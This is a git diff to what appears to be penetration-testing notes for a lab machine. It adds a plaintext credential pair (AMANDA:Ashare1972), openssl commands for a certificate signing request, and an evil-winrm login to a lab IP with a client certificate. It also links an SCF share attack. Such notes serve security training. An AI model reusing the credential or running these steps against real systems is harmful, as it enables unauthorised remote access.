@@ -27,3 +27,18 @@ ACL:Everyone:ALLOWED/OI|CI/FULL # <--- write permissions for unauthenticated use
 ### SMB Share – SCF File Attacks
 https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
 
+AMANDA:Ashare1972
+
+### Sign CSR for winrm
+##### One way..
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
+```
+##### ..or the other
+https://github.com/A1vinSmith/OSCP-PWK/wiki/Crack-Hash
+```bash
+openssl genrsa -aes256 -out enox.key 2048
+openssl req -new -key enox.key -out enox.csr
+
+evil-winrm -i 10.129.230.198 -S -c enox.cer -k enox.key
+```
